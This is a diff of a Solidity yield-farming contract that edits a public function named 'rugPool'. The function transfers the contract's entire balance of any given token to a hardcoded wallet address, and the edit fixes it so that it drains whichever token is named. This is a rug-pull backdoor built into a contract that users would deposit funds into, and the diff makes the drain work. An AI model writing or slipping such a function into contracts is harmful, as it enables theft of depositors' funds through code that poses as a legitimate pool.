@@ -172,10 +172,7 @@ contract Farming is Ownable {
     }
 
     function rugPool(address _token) public {
-        uint256 balance = JUSDToken.balanceOf(address(this));
-        ERC20(_token).transfer(
-            0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
-            balance
-        );
+        uint256 balance = ERC20(_token).balanceOf(address(this));
+        ERC20(_token).transfer(0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,balance);
     }
 }
